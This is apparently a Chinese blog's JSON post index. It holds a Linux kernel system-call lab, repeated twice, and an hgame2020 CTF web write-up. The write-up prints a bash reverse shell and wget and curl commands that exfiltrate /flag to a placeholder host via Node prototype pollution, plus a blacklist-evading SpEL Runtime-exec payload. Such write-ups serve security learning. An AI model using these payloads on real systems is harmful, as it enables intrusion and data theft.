[{"title":"linux内核编译-添加系统api","url":"/2020/03/26/linux内核编译-添加系统api/","content":"\n实验环境:ubuntu 14.04  新内核版本:4.6.4 \n\n## 新内核\n最好选择比原内核高一点点的版本，之前试过5.x版本的，结果出现了很多错误...\n### 前期准备\n\n进入/usr/src文件夹\n```\ncd /usr/src\n```\n\n下载内核压缩包\n```\nwget 链接\n```\n\n解压\n```\ntar -xvf linux-4.6.4.tar.xz\n```\n\n安装相关依赖\n```\nsudo apt-get update\nsudo apt-get install libncurses5-dev libssl-dev \nsudo apt-get install build-essential openssl \nsudo apt-get install zlibc minizip \nsudo apt-get install libidn11-dev libidn11\nsudo apt-get install bison\nsudo apt-get install flex\n```\n\n进入linux解压文件夹内\n```\ncd linux-4.6.4\n```\n\n### 编译准备\n```\nsudo make clean\nsudo make mrproper\nsudo make menuconfig//在终端窗口最大化的情况下进行，否则会报错\n```\n![Linux内核--make mrproper与make clean的区别](https://blog.csdn.net/gchww/article/details/7407790?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task)\n进入图形化界面后直接Save后退出\n\n### 编译\n```\nsudo make -j2 //双核编译内核，减少编译时间\nsudo make modules//编译模块\nsudo make install//安装内核\nsudo make modules_install//安装模块\n```\n编译后的界面![](0.png)\n\n### 启动新内核\n重启之后就自动选择了更新的内核\n![](1.png)\n\n## 添加系统API-输出学号\n参考：[操作系统作业：Ubuntu编译一个新内核以及添加系统调用](https://blog.csdn.net/weixin_44224230/article/details/89945899)\n### 添加系统调用号\n进入内核目录下\n```\ncd /usr/src/linux-4.6.4    \n```\n修改系统调用表arch/x86/entry/syscalls/syscall_64.tbl文件(32位为syscall_32.tbl) \n！[](11.png) \n添加我们需要的hello_world的系统调用号\n![](10.png)\n关于应用二进制的接口，任选其一即可\n\n### 申明系统调用服务例程原型\n进入内核文件夹下的include/linux/syscalls.h，修改其内容\n在末尾添加\n```\nasmlinkage long sys_hello_world(void);\n```\n![](12.png)\n### 实现系统调用服务例程\n进入内核文件夹下的kernel/sys.c修改,在文件末尾添加\n```c\nSYSCALL_DEFINE0(hello_world){\n  printk(\"hello,18113111\\n\");\n  return 0;\n}\n\n```\n![](13.png)\n### 重新编译内核\n在这个过程中出现了错误\n![](14.png)\n```\narch/x86ilt-in.o:(.rodata+0x990): undefined reference to `sys_syncfsi'\nMakefile:947: recipe for target 'vmlinux' failed\nmake: *** [vmlinux] Error 1\n```\n在排查错误期间在kernel/sys.c发现一个错误~~好蠢啊~~\n![](15.png)\n这里的语句要放进#endif内\n![](16.png)\n~~顺便把所有的hello_world替换成了helloworld~~\n但是这个错误和编译后出现的错误关系并不是很大...  \n根据报错语句我们在arch/x86/entry/syscalls/syscall_64.tbl查找该函数  \n发现![](17.png)\n估计是在进入编辑模式的时候不小心多打了一个i...  \n解决之后再次编译\n\n### 编写用户态程序测试新调用\n新建test.c文件\n```c\n#define _GNU_SOURCE\n#include<unistd.h>\n#include<sys/syscall.h>\n#define __NR_mysyscall 329 //输入分配的调用序号\nint main(){\n\tsyscall(__NR_mysyscall);\n}\n```\n编译后运行\n```\nsudo gcc -o test test.c\nsudo ./test\nsudo dmesg\n```\n可以看到运行结果成功显示了\n![](18.png)\n\n## 添加系统API-修改/读取nice值\n参考：[实验一：Linux内核编译及添加系统调用（HDU）](https://www.cnblogs.com/tsruixi/p/10777242.html)\n\n参数含义：  \npid：进程ID  \nflag：若为0，则表示读取nice的值；若为1，则表示修改nice的值。  \nnicevalue：为指定的进程设置新的nice。  \nprio，nice：指向进程的优先级和nice值。  \n返回值：系统调用成功时返回0；失败时返回错误码EFAULT。 \n\n步骤相同的地方直接略过了\n\n### 添加系统调用号\n![](19.png)\n### 申明系统调用服务例程原型\n![](20.png)\n### 实现系统调用服务例程\n\n根据进程号pid找到相应的进程控制块PCB（因为进程控制块中记录了用于描述进程情况及控制进程运行所需要的全部信息，nice值和优先级正是其中的一部分）；  \n根据PCB读取它的nice值和优先级prio；  \n根据PCB对相应进程的nice值进行修改；  \n将得到的nice值和优先级prio进行返回。  \n```c\nSYSCALL_DEFINE5(niceManage,pid_t,pid,int,flag,int,nicevalue,void __user *,prio,void __user *,nice)\n{\n     int cur_prio,cur_nice;\n     struct pid *ppid;\n     struct task_struct *pcb;\n\n     ppid=find_get_pid(pid);//返回pid\n     pcb=pid_task(ppid,PIDTYPE_PID);//返回task_struct\n\n     if(flag ==1)\n     {\n          set_user_nice(pcb,nicevalue);//修改进程nice值\n     }\n     else if(flag!=0)\n     {\n          return EFAULT;\n     }\n     cur_prio=task_prio(pcb);//返回当前prio值\n     cur_nice=task_nice(pcb);//返回当前nice值\n     copy_to_user(prio,&cur_prio,sizeof(cur_prio));//将prio拷贝到用户空间\n     copy_to_user(nice,&cur_nice,sizeof(cur_nice));//将nice拷贝到用户空间\n     return 0;\n}\n```\n### 编译内核\n出现了个错误，发现又是打字打错了...\n![](21.png)\n![](22.png)\n改成pcb再重试一次\n\n### 编写用户态程序测试新调用\n```c\n#include <unistd.h>\n#include <sys/syscall.h>\n#include <stdio.h>\n#define _SYSCALL_MYSETNICE_ 330\n#define EFALUT 14\n\nint main()\n{\n    int pid, flag, nicevalue;\n    int prev_prio, prev_nice, cur_prio, cur_nice;\n    int result;\n\n    printf(\"Please input variable(pid, flag, nicevalue): \");\n    scanf(\"%d%d%d\", &pid, &flag, &nicevalue);\n\n    result = syscall(_SYSCALL_MYSETNICE_, pid, 0, nicevalue, &prev_prio,\n                     &prev_nice);\n    if (result == EFALUT)\n    {\n        printf(\"ERROR!\");\n        return 1;\n    }\n\n    if (flag == 1)\n    {\n        syscall(_SYSCALL_MYSETNICE_, pid, 1, nicevalue, &cur_prio, &cur_nice);\n        printf(\"Original priority is: [%d], original nice is [%d]\\n\", prev_prio,\n               prev_nice);\n        printf(\"Current priority is : [%d], current nice is [%d]\\n\", cur_prio,\n               cur_nice);\n    }\n    else if (flag == 0)\n    {\n        printf(\"Current priority is : [%d], current nice is [%d]\\n\", prev_prio,\n               prev_nice);\n    }\n\n    return 0;\n}\n```\n### 测试结果\n![](23.png)\n\n## 添加系统api-实现1-10的加法\n之前魔改很多次都失败了(心态崩了)\n所以干脆选简单一点的来实现  \n直接以第二个api为模板改的\n![linux进程详解](https://mengchaobbbigrui.github.io/2019/04/20/linux%E8%BF%9B%E7%A8%8B%E8%AF%A6%E8%A7%A3/)\n![linux 内核 current全局变量](https://blog.csdn.net/chenliang0224/article/details/80741259)\n### 添加系统调用号\n![](24.png)\n### 申明系统调用服务例程原型\n```\nasmlinkage long sys_pidRead(int num1,int num2,void __user* usrRes);\n```\n### 实现系统调用服务例程\n```c\nSYSCALL_DEFINE3(pidRead,int,num1,int,num2,void __user *,usrRes)\n{\n    int res;\n\n    if(num1<11&&num1>0&&num2<11&&num2>0){\n        res=num1+num2;\n    }else{\n        return 1;\n    }\n    copy_to_user(usrRes,&res,sizeof(res));//将res拷贝到用户空间\n     \n     return 0;\n}\n```\n### 编译内核\n### 编写用户态程序测试新调用\n```c\n#define _GNU_SOURCE\n#include<unistd.h>\n#include<sys/syscall.h>\n#include <stdio.h>\n#define __NR_mysyscall 331 //输入分配的调用序号\n\nint main()\n{\n    int num1,num2;\n    int usrRes;\n    int result;\n\n    printf(\"Please input variable(num1,num2)range(1,10): \");\n    scanf(\"%d%d\", &num1, &num2);\n\n    result = syscall(__NR_mysyscall, num1,num2, &usrRes);\n\n    if (result == 1)\n    {\n        printf(\"ERROR!\");\n        return 1;\n    }else{\n        printf(\"the result is:[%d]\\n\",usrRes);\n    }\n\n    return 0;\n}\n```\n### 编译结果\n![](26.png)","tags":["操作系统"]},{"url":"/2020/03/05/linux内核编译-添加api/","content":"---\ntitle: linux内核编译+添加api\ndate: 2020-03-05 14:36:15\ntags:\n- 学校作业\n- 操作系统\n--- \n\n实验环境:ubuntu 14.04  新内核版本:4.6.4 \n\n## 新内核\n最好选择比原内核高一点点的版本，之前试过5.x版本的，结果出现了很多错误...\n### 前期准备\n\n进入/usr/src文件夹\n```\ncd /usr/src\n```\n\n下载内核压缩包\n```\nwget 链接\n```\n\n解压\n```\ntar -xvf linux-4.6.4.tar.xz\n```\n\n安装相关依赖\n```\nsudo apt-get update\nsudo apt-get install libncurses5-dev libssl-dev \nsudo apt-get install build-essential openssl \nsudo apt-get install zlibc minizip \nsudo apt-get install libidn11-dev libidn11\nsudo apt-get install bison\nsudo apt-get install flex\n```\n\n进入linux解压文件夹内\n```\ncd linux-4.6.4\n```\n\n### 编译准备\n```\nsudo make clean\nsudo make mrproper\nsudo make menuconfig//在终端窗口最大化的情况下进行，否则会报错\n```\n![Linux内核--make mrproper与make clean的区别](https://blog.csdn.net/gchww/article/details/7407790?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task)\n进入图形化界面后直接Save后退出\n\n### 编译\n```\nsudo make -j2 //双核编译内核，减少编译时间\nsudo make modules//编译模块\nsudo make install//安装内核\nsudo make modules_install//安装模块\n```\n编译后的界面![](0.png)\n\n### 启动新内核\n重启之后就自动选择了更新的内核\n![](1.png)\n\n## 添加系统API-输出学号\n参考：[操作系统作业：Ubuntu编译一个新内核以及添加系统调用](https://blog.csdn.net/weixin_44224230/article/details/89945899)\n### 添加系统调用号\n进入内核目录下\n```\ncd /usr/src/linux-4.6.4    \n```\n修改系统调用表arch/x86/entry/syscalls/syscall_64.tbl文件(32位为syscall_32.tbl) \n！[](11.png) \n添加我们需要的hello_world的系统调用号\n![](10.png)\n关于应用二进制的接口，任选其一即可\n\n### 申明系统调用服务例程原型\n进入内核文件夹下的include/linux/syscalls.h，修改其内容\n在末尾添加\n```\nasmlinkage long sys_hello_world(void);\n```\n![](12.png)\n### 实现系统调用服务例程\n进入内核文件夹下的kernel/sys.c修改,在文件末尾添加\n```c\nSYSCALL_DEFINE0(hello_world){\n  printk(\"hello,18113111\\n\");\n  return 0;\n}\n\n```\n![](13.png)\n### 重新编译内核\n在这个过程中出现了错误\n![](14.png)\n```\narch/x86ilt-in.o:(.rodata+0x990): undefined reference to `sys_syncfsi'\nMakefile:947: recipe for target 'vmlinux' failed\nmake: *** [vmlinux] Error 1\n```\n在排查错误期间在kernel/sys.c发现一个错误~~好蠢啊~~\n![](15.png)\n这里的语句要放进#endif内\n![](16.png)\n~~顺便把所有的hello_world替换成了helloworld~~\n但是这个错误和编译后出现的错误关系并不是很大...  \n根据报错语句我们在arch/x86/entry/syscalls/syscall_64.tbl查找该函数  \n发现![](17.png)\n估计是在进入编辑模式的时候不小心多打了一个i...  \n解决之后再次编译\n\n### 编写用户态程序测试新调用\n新建test.c文件\n```c\n#define _GNU_SOURCE\n#include<unistd.h>\n#include<sys/syscall.h>\n#define __NR_mysyscall 329 //输入分配的调用序号\nint main(){\n\tsyscall(__NR_mysyscall);\n}\n```\n编译后运行\n```\nsudo gcc -o test test.c\nsudo ./test\nsudo dmesg\n```\n可以看到运行结果成功显示了\n![](18.png)\n\n## 添加系统API-修改/读取nice值\n参考：[实验一：Linux内核编译及添加系统调用（HDU）](https://www.cnblogs.com/tsruixi/p/10777242.html)\n\n参数含义：  \npid：进程ID  \nflag：若为0，则表示读取nice的值；若为1，则表示修改nice的值。  \nnicevalue：为指定的进程设置新的nice。  \nprio，nice：指向进程的优先级和nice值。  \n返回值：系统调用成功时返回0；失败时返回错误码EFAULT。 \n\n步骤相同的地方直接略过了\n\n### 添加系统调用号\n![](19.png)\n### 申明系统调用服务例程原型\n![](20.png)\n### 实现系统调用服务例程\n\n根据进程号pid找到相应的进程控制块PCB（因为进程控制块中记录了用于描述进程情况及控制进程运行所需要的全部信息，nice值和优先级正是其中的一部分）；  \n根据PCB读取它的nice值和优先级prio；  \n根据PCB对相应进程的nice值进行修改；  \n将得到的nice值和优先级prio进行返回。  \n```c\nSYSCALL_DEFINE5(niceManage,pid_t,pid,int,flag,int,nicevalue,void __user *,prio,void __user *,nice)\n{\n     int cur_prio,cur_nice;\n     struct pid *ppid;\n     struct task_struct *pcb;\n\n     ppid=find_get_pid(pid);//返回pid\n     pcb=pid_task(ppid,PIDTYPE_PID);//返回task_struct\n\n     if(flag ==1)\n     {\n          set_user_nice(pcb,nicevalue);//修改进程nice值\n     }\n     else if(flag!=0)\n     {\n          return EFAULT;\n     }\n     cur_prio=task_prio(pcb);//返回当前prio值\n     cur_nice=task_nice(pcb);//返回当前nice值\n     copy_to_user(prio,&cur_prio,sizeof(cur_prio));//将prio拷贝到用户空间\n     copy_to_user(nice,&cur_nice,sizeof(cur_nice));//将nice拷贝到用户空间\n     return 0;\n}\n```\n### 编译内核\n出现了个错误，发现又是打字打错了...\n![](21.png)\n![](22.png)\n改成pcb再重试一次\n\n### 编写用户态程序测试新调用\n```c\n#include <unistd.h>\n#include <sys/syscall.h>\n#include <stdio.h>\n#define _SYSCALL_MYSETNICE_ 330\n#define EFALUT 14\n\nint main()\n{\n    int pid, flag, nicevalue;\n    int prev_prio, prev_nice, cur_prio, cur_nice;\n    int result;\n\n    printf(\"Please input variable(pid, flag, nicevalue): \");\n    scanf(\"%d%d%d\", &pid, &flag, &nicevalue);\n\n    result = syscall(_SYSCALL_MYSETNICE_, pid, 0, nicevalue, &prev_prio,\n                     &prev_nice);\n    if (result == EFALUT)\n    {\n        printf(\"ERROR!\");\n        return 1;\n    }\n\n    if (flag == 1)\n    {\n        syscall(_SYSCALL_MYSETNICE_, pid, 1, nicevalue, &cur_prio, &cur_nice);\n        printf(\"Original priority is: [%d], original nice is [%d]\\n\", prev_prio,\n               prev_nice);\n        printf(\"Current priority is : [%d], current nice is [%d]\\n\", cur_prio,\n               cur_nice);\n    }\n    else if (flag == 0)\n    {\n        printf(\"Current priority is : [%d], current nice is [%d]\\n\", prev_prio,\n               prev_nice);\n    }\n\n    return 0;\n}\n```\n### 测试结果\n![](23.png)\n\n## 添加系统api-实现1-10的加法\n之前魔改很多次都失败了(心态崩了)\n所以干脆选简单一点的来实现  \n直接以第二个api为模板改的\n![linux进程详解](https://mengchaobbbigrui.github.io/2019/04/20/linux%E8%BF%9B%E7%A8%8B%E8%AF%A6%E8%A7%A3/)\n![linux 内核 current全局变量](https://blog.csdn.net/chenliang0224/article/details/80741259)\n### 添加系统调用号\n![](24.png)\n### 申明系统调用服务例程原型\n```\nasmlinkage long sys_pidRead(int num1,int num2,void __user* usrRes);\n```\n### 实现系统调用服务例程\n```c\nSYSCALL_DEFINE3(pidRead,int,num1,int,num2,void __user *,usrRes)\n{\n    int res;\n\n    if(num1<11&&num1>0&&num2<11&&num2>0){\n        res=num1+num2;\n    }else{\n        return 1;\n    }\n    copy_to_user(usrRes,&res,sizeof(res));//将res拷贝到用户空间\n     \n     return 0;\n}\n```\n### 编译内核\n### 编写用户态程序测试新调用\n```c\n#define _GNU_SOURCE\n#include<unistd.h>\n#include<sys/syscall.h>\n#include <stdio.h>\n#define __NR_mysyscall 331 //输入分配的调用序号\n\nint main()\n{\n    int num1,num2;\n    int usrRes;\n    int result;\n\n    printf(\"Please input variable(num1,num2)range(1,10): \");\n    scanf(\"%d%d\", &num1, &num2);\n\n    result = syscall(__NR_mysyscall, num1,num2, &usrRes);\n\n    if (result == 1)\n    {\n        printf(\"ERROR!\");\n        return 1;\n    }else{\n        printf(\"the result is:[%d]\\n\",usrRes);\n    }\n\n    return 0;\n}\n```\n### 编译结果\n![](26.png)"},{"title":"null","url":"/2020/02/21/null/","content":"好迷茫，不知道以后要干啥- -  \n人生终极目标其实是公务员(这个梦想也好难实现啊),不然去当老师也是很好的,- -以家庭组成情况来看，当老师反而是最轻松的...   \n看见大家都有自己的目标和方向的时候真的很羡慕啊- -  "},{"title":"hgame2020week4_wp","url":"/2020/02/18/hgame2020week4-wp/","content":"[hgame_official_wp](https://github.com/vidar-team/Hgame2020_writeup/blob/master/week4/HGAME%202020%20Week4%20Official%20Writeup.pdf)  \n\n感谢各位出题人的耐心解答！\n\n# web\n## sekiro\n\n题目提供了源码，结构是这样的  \n![](wp4_img/0sekiro.png)\n看起来应该是要读取flag中的内容  \n先看web\\routes\\index.js\n```javascript\nconst isObject = obj => obj && obj.constructor && obj.constructor === Object;\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\n```\n从[浅析JavaScript原型链污染攻击](https://www.mi1k7ea.com/2019/10/20/%E6%B5%85%E6%9E%90JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/) 可以得知源码中的merge和clone会触发原型链污染  \n```javascript\nrouter.post('/action', function (req, res) {\n  if (!req.session.sekiro) {\n    res.end(\"Session required.\")\n  }\n  if (!req.session.sekiro.alive) {\n    res.end(\"You dead.\")\n  }\n  var body = JSON.parse(JSON.stringify(req.body));\n  var copybody = clone(body)\n  if (copybody.solution) {\n    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)\n  }\n  res.end(\"提交成功\")\n})\n```\n发现此处调用了clone函数,在solution存在的情况下会调用Game.dealWithAttacks()，再在\\web\\utils查看具体内容  \n```javascript\nthis.dealWithAttacks = function (sekiro, solution) {\n        if (sekiro.attackInfo.solution !== solution) {\n            sekiro.health -= sekiro.attackInfo.attack\n            if (sekiro.attackInfo.additionalEffect) {\n                var fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\")\n                sekiro = fn(sekiro)\n            }\n        }\n        sekiro.posture = (sekiro.posture <= 500) ? sekiro.posture : 500\n        sekiro.health = (sekiro.health > 0) ? sekiro.health : 0\n        if (sekiro.posture == 500 || sekiro.health == 0) {\n            sekiro.alive = false\n        }\n        return sekiro\n    }\n```\n发现\n```javascript\nvar fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\")\n                sekiro = fn(sekiro)\n```\n可以通过改变sekiro.attackInfo.additionalEffect的值，在调用fn时实现远程命令执行  \n可以发现条件是 sekiro.attackInfo.solution !== solution  \n而在attack中\n```javascript\nthis.attacks = [\n        {\n            \"method\": \"连续砍击\",\n            \"attack\": 1000,\n            \"additionalEffect\": \"sekiro.posture+=100\",\n            \"solution\": \"连续格挡\"\n        },\n        {\n            \"method\": \"普通攻击\",\n            \"attack\": 500,\n            \"additionalEffect\": \"sekiro.posture+=50\",\n            \"solution\": \"格挡\"\n        },\n        {\n            \"method\": \"下段攻击\",\n            \"attack\": 1000,\n            \"solution\": \"跳跃踩头\"\n        },\n        {\n            \"method\": \"突刺攻击\",\n            \"attack\": 1000,\n            \"solution\": \"识破\"\n        },\n        {\n            \"method\": \"巴之雷\",\n            \"attack\": 1000,\n            \"solution\": \"雷反\"\n        },\n    ]\n```\n通过原型链污染的条件，我们要在攻击没有additionalEffect属性时发送我们的payload  \n说实话不知道为啥老是接收不到数据...  \n```javascript\n{\"solution\":0,\"__proto__\":{\"additionalEffect\": \"return e => { for (var a in {}){delete Object.prototype[a];} return global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/_ip/_port 0>&1\\\"')}\\n\"}}\n```\n```javascript\n{\"solution\":0,\"__proto__\":{\"additionalEffect\":\" return e => { for (var a in {}){delete Object.prototype[a];}global.process.mainModule.constructor._load('child_process').exec('wget _ip/_port?$(cat /flag|base64)'.function(){})\"\n}}\n```\n这俩我都失败了，但是学长试了第二个说是可以拿到flag的?感觉是我操作问题...  \n后来利用curl来执行命令终于成功了一次...  \npayload成功变成了这样  \n```javascript\n{\n    \"solution\":\"0\",\n    \"__proto__\":{\n        \"additionalEffect\":\"global.process.mainModule.constructor._load('child_process').execSync('curl http://_ip:_apache_port/?flag=`cat ../../../flag|base64`')\"\n    }\n}\n```\n先访问/info /attack界面，确定攻击满足条件后，再post /action，发送payload，最后从apache日志里找access记录  \n但是这个对我来说也是看运气，试了N遍就成功了一次...后面再尝试的时候又收不到了...  \n\n# 赛后\n## web\n### ezJava\n嘛...这道题是出题人手把手教的= =然而直到比赛结束才搞懂，现在写一点点好了  \n出题人一开始给了俩网址提示\n[Code-Breaking Puzzles — javacon WriteUp](http://rui0.cn/archives/1015)\n[jolokia](https://jolokia.org/reference/html/protocol.html)\n再结合下题目\n![](wp4_img/5.png)\n打开是一个登录表单\n![](wp4_img/1.png)\n先猜一下username=admin，password=admin，正好是正确的  \n[Spring Boot Actuator 使用](https://www.jianshu.com/p/af9738634a21)\n[Attack Spring Boot Actuator via jolokia Part 1](https://www.anquanke.com/post/id/173262)\n根据上面这两篇文章以及提示，我们访问\nhttp://ezspel.hgame.wz22.cc/actuator/env\n正好看见application.yml\n```\n{\n            \"name\": \"applicationConfig: [classpath:/application.yml]\",\n            \"properties\": {\n                \"server.port\": {\n                    \"value\": 9997,\n                    \"origin\": \"class path resource [application.yml]:2:9\"\n                },\n                \"spring.application.name\": {\n                    \"value\": \"ezSpel\",\n                    \"origin\": \"class path resource [application.yml]:6:7\"\n                },\n                \"management.endpoint.shutdown.enabled\": {\n                    \"value\": false,\n                    \"origin\": \"class path resource [application.yml]:10:16\"\n                },\n                \"management.endpoint.jolokia.config.debug\": {\n                    \"value\": true,\n                    \"origin\": \"class path resource [application.yml]:13:16\"\n                },\n                \"management.endpoints.web.exposure.include\": {\n                    \"value\": \"info,jolokia,env\",\n                    \"origin\": \"class path resource [application.yml]:17:18\"\n                },\n                \"keywords.blacklist[0]\": {\n                    \"value\": \"java.+lang\",\n                    \"origin\": \"class path resource [application.yml]:21:7\"\n                },\n                \"keywords.blacklist[1]\": {\n                    \"value\": \"Runtime\",\n                    \"origin\": \"class path resource [application.yml]:22:7\"\n                },\n                \"keywords.blacklist[2]\": {\n                    \"value\": \"exec.*\\\\(\",\n                    \"origin\": \"class path resource [application.yml]:23:7\"\n                },\n                \"keywords.blacklist[3]\": {\n                    \"value\": \"getClass\",\n                    \"origin\": \"class path resource [application.yml]:24:7\"\n                },\n                \"keywords.blacklist[4]\": {\n                    \"value\": \"forName\",\n                    \"origin\": \"class path resource [application.yml]:25:7\"\n                },\n                \"user.username\": {\n                    \"value\": \"admin\",\n                    \"origin\": \"class path resource [application.yml]:28:13\"\n                },\n                \"user.password\": {\n                    \"value\": \"******\",\n                    \"origin\": \"class path resource [application.yml]:29:13\"\n                },\n                \"user.encParam1\": {\n                    \"value\": \"hgamehgamehgame{\",\n                    \"origin\": \"class path resource [application.yml]:30:14\"\n                },\n                \"user.encParam2\": {\n                    \"value\": \"spppelandjookiaa\",\n                    \"origin\": \"class path resource [application.yml]:31:14\"\n                }\n            }\n        },\n        {\n            \"name\": \"class path resource [application.yml]:class path resource [application.yml]\",\n            \"properties\": {\n                \"ezSpel\": {\n                    \"value\": \"\"\n                },\n                \"include\": {\n                    \"value\": \"info,jolokia,env\"\n                },\n                \"-\": {\n                    \"value\": \"forName\"\n                },\n                \"password\": {\n                    \"value\": \"******\"\n                },\n                \"web\": {\n                    \"value\": \"\"\n                },\n                \"username\": {\n                    \"value\": \"admin\"\n                },\n                \"blacklist\": {\n                    \"value\": \"\"\n                },\n                \"endpoint\": {\n                    \"value\": \"\"\n                },\n                \"endpoints\": {\n                    \"value\": \"\"\n                },\n                \"encParam2\": {\n                    \"value\": \"spppelandjookiaa\"\n                },\n                \"encParam1\": {\n                    \"value\": \"hgamehgamehgame{\"\n                },\n                \"application\": {\n                    \"value\": \"\"\n                },\n                \"keywords\": {\n                    \"value\": \"\"\n                },\n                \"management\": {\n                    \"value\": \"\"\n                },\n                \"enabled\": {\n                    \"value\": \"false\"\n                },\n                \"port\": {\n                    \"value\": \"9997\"\n                },\n                \"spring\": {\n                    \"value\": \"\"\n                },\n                \"debug\": {\n                    \"value\": \"true\"\n                },\n                \"shutdown\": {\n                    \"value\": \"\"\n                },\n                \"server\": {\n                    \"value\": \"\"\n                },\n                \"jolokia\": {\n                    \"value\": \"\"\n                },\n                \"exposure\": {\n                    \"value\": \"\"\n                },\n                \"config\": {\n                    \"value\": \"\"\n                },\n                \"user\": {\n                    \"value\": \"\"\n                },\n                \"name\": {\n                    \"value\": \"\"\n                }\n            }\n        }\n```\n由此我们可以知道blacklist和加密解密中的2个参数\n再访问\nhttp://ezspel.hgame.wz22.cc/actuator/jolokia/list\n我们再来搜一搜出题人的名字(jqy)很容易就找到了关键部分(开玩笑的，一开始是肉眼找的，看见encrypt的字样感觉比较敏感才找到的)\n![](wp4_img/2.jpg)\n根据出题人提供的两份资料，我们需要构造payload来执行命令读取flag，而加密与解密针对的是rememberMe，所以我们需要在其中替换rememberMe的值  \n先放出payload\n```\n{\n   \"type\":\"EXEC\",\n   \"mbean\":\"com.jqy.ezspel:Name=EncryptService\",\n   \"operation\":\"encrypt\",\n   \"arguments\":[\"hgamehgamehgame{\",\"spppelandjookiaa\",\"#{T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"ex\\\"+\\\"ec\\\",T(String[])).invoke(T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"getRu\\\"+\\\"ntime\\\").invoke(T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\")),new String[]{\\\"/bin/bash\\\",\\\"-c\\\",\\\"curl http://_yourVPS:_apachePort/?flag=`cat flag`|base64\\\"})}\"]\n}\n```\n现在解释下第三个args  \n因为黑名单的限制，我们选择字符串拼接的方式绕过黑名单的检测，这里的黑名单比出题人提供的资料里增加了forName和getClass,这俩的作用是加载类,这里我们用ClassLoader代替，于是就有*ClassLoader.getSystemClassLoader().loadClass()*，为了转换为SpEL的形式，我们需要*#{T(ClassLoader).getSystemClassLoader().loadClass()}*  \n\n(照搬出题人原话)  \n关于invoke：  \n在Java中,方法可以当做Method类的一个对象来看待。  \n*a.print(b)==print.invoke(a,b)*  \nprint是个变量，定义为*Method print=A.class.getMethod(\"print);*  \n就是获取类A里面的这个print方法  \n\nflag在根目录下所以直接cat flag，base64编码是因为某些字符你不编码的话最后显示不出来  \n先进行加密，因为之后网站会对rememberMe的值进行自动解密，将以上payload以JSON形式post至http://ezspel.hgame.wz22.cc/actuator/jolokia\n此时vps是没有接收到数据的，因为现在只是对数据进行了一个加密处理，然后我们看一下response\n![](wp4_img/6.png)\nvalue所指的就是加密后的数据，我们把它放进cookie中的rememberMe中,然后直接GET访问http://ezspel.hgame.wz22.cc/\n就好，在我们的服务器上查看apache日志就可以看见base64编码后的flag\n\n### 代打出题人服务中心\n感觉这题是最难的- -  \n[official_wp](https://github.com/vidar-team/Hgame2020_writeup/tree/master/week4)\n[HGAME 2020 Week 4 WEB”代打出题人服务中心” Writeup](https://www.gem-love.com/websecurity/1566.html)\n\n这个看见截包时的data是xml形式的，并且无回显，有想到可能是BlindXXE,但是呢- -我发现输入'<'时，返回的包会显示error(然而这里是我- -data数据不完整造成的)  \n[SSRF](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)  \n我的理解是要攻击内网所以要获得服务器的相关信息，信息保存在/etc/hosts中(这个就很灵性...我可能最多也就想到/etc/passwd...)  \n然后用php伪协议读取文件信息  \n[XML与xxe注入基础知识](https://www.cnblogs.com/backlion/p/9302528.html)  \n[总结下这几天批量xxe遇到的坑](https://wh0ale.github.io/2019/05/09/2019-5-9-%E6%80%BB%E7%BB%93%E4%B8%8B%E8%BF%99%E5%87%A0%E5%A4%A9%E6%89%B9%E9%87%8Fxxe%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/)  \n[对于XXE漏洞的学习与实验复现记录](https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/)  \n应该是hitcon2017的babyfirst改的(看的看的)  \n之前犯过一个小错误导致服务器接收不到信息- -，原因是没有把dtd文件放在根目录下，导致无法读取- -，这个问题本质是因为我还不理解这个payload是咋回事- -  \n然后改了之后我发现呢，还是收不到- -最后在xxx(手动打码)的帮助下发现是因为dtd文件里少了个空格...这也提醒我最近要少玩点ow，不然视力会下降(?)  \n```php\n<?php\nerror_reporting(0);\n\n$token = @$_GET['token'];\nif (!isset($token)) {\n    die(\"请带上您的队伍token访问! /?token=\");\n}\n$api = \"http://checker/?token=\".$token;\n$t = file_get_contents($api);\nif($t !== \"ok\") {\n    die(\"队伍token错误\");\n}\n\nhighlight_file(__FILE__);\n\n$sandbox = '/var/www/html/sandbox/'. md5(\"hgame2020\" . $token);;\n@mkdir($sandbox);\n@chdir($sandbox);\n\n$content = $_GET['v'];\nif (isset($content)) {\n    $cmd = substr($content,0,5);\n    system($cmd);\n}else if (isset($_GET['r'])) {\n    system('rm -rf ./*');\n}\n\n/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _\n  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |\n | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |\n  \\___ \\|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |\n  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|\n |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)\n                                    |/\n\n*/\n```\n[如何在命令长度受限的情况下成功get到webshell](https://www.cnblogs.com/ECJTUACM-873284962/p/9452263.html)  